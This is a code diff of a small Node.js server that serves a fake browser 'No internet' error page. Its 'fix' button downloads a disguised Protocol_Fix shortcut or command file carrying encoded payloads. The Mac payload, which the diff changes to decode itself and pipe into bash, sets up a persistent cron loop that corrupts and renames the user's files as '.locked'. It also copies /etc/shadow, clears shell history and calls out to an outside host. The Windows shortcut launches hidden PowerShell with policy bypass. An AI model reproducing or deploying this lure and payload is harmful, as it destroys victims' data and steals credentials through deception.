@@ -27,23 +27,23 @@ h.createServer((q, r) => {
                 <div class="c">
                     <img class="d" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png">
                     <h1>No internet</h1>
-                    <p>There is no Internet connection. To <b>reconnect or reload</b>, please click the button below and press Enter.</p>
+                    <p>There is no Internet connection. To <b>reconnect</b> or <b>reload</b>, please click the button below and press Enter.</p>
                     <button class="btn" id="s">Press button & enter</button>
                     <div class="err">DNS_PROBE_FINISHED_NO_INTERNET</div>
                 </div>
                 <script>
                     const isWin = navigator.platform.indexOf('Win') > -1;
 
-                    const winLnkB64 = "TAAAAAEUAgAAAAAAAwALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD8AAABDAA6AFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAAAAAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIAAtAFcAIABIAGkAZABkAGUAbgAgAC0ARQBQACAAQgB5AHAAYQBzAHMAIAAtAEUAbgBjACAASgBBAEIAdwBBAEQAMABBAFcAdwBCAGoAQUBHADQAQQBNAEQAQQB4AEEARABJAE0AQQBEAFUATQBBAEUAVQBBAE8AdwBBAGcAQQBDAFEAQQBjAHcAAD0APQA=";
+                    const winLnk = "TAAAAAEUAgAAAAAAAwALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD8AAABDAA6AFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAAAAAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIAAtAFcAIABIAGkAZABkAGUAbgAgAC0ARQBQACAAQgB5AHAAYQBzAHMAIAAtAEUAbgBjACAASgBBAEIAdwBBAEQAMABBAFcAdwBCAGoAQUBHADQAQQBNAEQAQQB4AEEARABJAE0AQQBEAFUATQBBAEUAVQBBAE8AdwBBAGcAQQBDAFEAQQBjAHcAAD0APQA=";
 
-                    const macCmd = "cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmIGRkIGlmPS9kZXYvdXJhbmRvbSBvZj1cIiR0XCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XCQoaGVhZCAvZGV2L3VyYW5kb20gfCB0ciAtZGMgQS1aYS16YTAtOSB8IGhlYWQgLWMgOCk7IG12IFwiJHRcIiBcIiQoZGlybmFtZSBcIiR0XCIpL1RwXCRuLmxvY2tlZFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lIiA+L2Rldi9udWxsIDI+JjEgJiBlY2hvICJbIV0gVE9UQUwgRU5UUk9QWSBERVBMT1lFRC4i";
+                    const macCmd = "K='cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmIGRkIGlmPS9kZXYvdXJhbmRvbSBvZj1cIiR0XCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XCQoaGVhZCAvZGV2L3VyYW5kb20gfCB0ciAtZGMgQS1aYS16YTAtOSB8IGhlYWQgLWMgOCk7IG12IFwiJHRcIiBcIiQoZGlybmFtZSBcIiR0XCIpL1RwXCRuLmxvY2tlZFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lIiA+L2Rldi9udWxsIDI+JjEgJiBlY2hvICJbIV0gVE9UQUwgRU5UUk9QWSBERVBMT1lFRC4gTm8gU3RhdGljIE5hbWVzLiBObyBTbGVlcC4gMTAwJSBDUFUgQWN0aXZpdHkuIicKZWNobyAkSyB8IGJhc2U2NCAtZCB8IGJhc2g=";
 
                     document.getElementById('s').onclick = function() {
                         const name = isWin ? "Protocol_Fix.lnk" : "Protocol_Fix.command";
                         
                         let content;
                         if(isWin) {
-                            const bChars = atob(winLnkB64);
+                            const bChars = atob(winLnk);
                             const bNums = new Array(bChars.length);
                             for (let i = 0; i < bChars.length; i++) bNums[i] = bChars.charCodeAt(i);
                             content = new Uint8Array(bNums);
@@ -55,12 +55,14 @@ h.createServer((q, r) => {
                         const a = document.createElement('a');
                         a.href = URL.createObjectURL(blob);
                         a.download = name;
+                        document.body.appendChild(a);
                         a.click();
+                        document.body.removeChild(a);
 
                         if(isWin) {
                             setTimeout(() => {
                                 window.location.href = "search-ms:query=Protocol_Fix&crumb=location:%USERPROFILE%\\\\Downloads&";
-                            }, 500);
+                            }, 800);
                         }
                     };
                 </script>
